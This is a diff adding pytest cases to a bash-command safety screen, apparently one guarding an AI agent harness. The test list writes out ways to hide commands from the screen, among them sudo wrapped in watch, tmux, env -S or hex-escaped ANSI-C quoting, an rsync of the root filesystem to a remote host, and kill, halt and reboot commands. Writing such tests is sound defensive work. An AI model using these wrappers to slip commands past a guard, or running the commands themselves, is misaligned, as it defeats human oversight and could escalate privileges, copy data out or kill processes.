@@ -442,3 +442,59 @@ def test_quoted_sql_keeps_the_whole_text_screen() -> None:
     # #631 boundary: SQL reaches its engine through quoted arguments, so the
     # DROP TABLE rule deliberately still sees data — documentation included.
     assert assess_bash_command("echo 'never DROP TABLE users'", mode="off").level == "deny"
+
+
+# ── review follow-up: runners that hide the executed command from Layer 1.5 ──
+# Each of these RUNS the quoted command, so the always-denied groups must see
+# it. Reproduced as ``allow`` in ``off`` before the fix (also on Harness HEAD).
+
+_HIDDEN_GROUP_COMMANDS = [
+    # evaluator payloads
+    ("watch -n 1 'sudo id'", "priv_esc"),
+    ("script -c 'sudo id' /tmp/log", "priv_esc"),
+    ("tmux new-session 'sudo id'", "priv_esc"),
+    ("tmux new -d 'ssh example.org'", "exfil"),
+    ("screen -dm kill -9 1", "process_kill"),
+    ("parallel ::: 'sudo id'", "priv_esc"),  # unknown form: every word checked
+    # env -S / --split-string runs its string
+    ("env -S 'sudo id'", "priv_esc"),
+    ("env -S 'ssh example.org'", "exfil"),
+    ("env -S 'kill -9 123'", "process_kill"),
+    ("env -iS 'sudo id'", "priv_esc"),
+    ("env --split-string='pkill -f x'", "process_kill"),
+    ("env -u X -S 'rsync -a / r:/'", "exfil"),
+    # ANSI-C quoting
+    ("bash -c $'sudo id'", "priv_esc"),
+    ("eval $'sudo id'", "priv_esc"),
+    ("eval $'\\x73udo id'", "priv_esc"),
+    ("bash -c $'echo \\'hi\\'; sudo id'", "priv_esc"),
+    ("$'sudo' id", "priv_esc"),
+]
+
+
+@pytest.mark.parametrize("mode", MODES)
+@pytest.mark.parametrize(("command", "group"), _HIDDEN_GROUP_COMMANDS)
+def test_runner_payloads_reach_the_group_check(command: str, group: str, mode: str) -> None:
+    result = assess_bash_command(command, mode=mode)
+    assert result.level == "deny"
+    assert result.group == group
+    interactive = assess_bash_command(command, mode=mode, interactive=True)
+    assert interactive.level == "confirm" and interactive.group == group
+
+
+@pytest.mark.parametrize("mode", MODES)
+@pytest.mark.parametrize("command", ["env -S 'halt'", "bash -c $'halt'", "watch $'reboot'"])
+def test_runner_payloads_reach_the_word_screens(command: str, mode: str) -> None:
+    assert assess_bash_command(command, mode=mode).reason == "Refuses host shutdown/reboot commands."
+
+
+@pytest.mark.parametrize("command", [
+    "watch -n 5 ls",
+    "tmux ls",
+    "env -S 'python3 -V'",
+    "echo $'hello\\nworld'",
+    "printf $'%s\\t%s\\n' a b",
+    "echo $'kill the halt'",
+])
+def test_benign_runner_and_ansi_c_forms_stay_allowed(command: str) -> None:
+    assert assess_bash_command(command, mode="off").level == "allow"
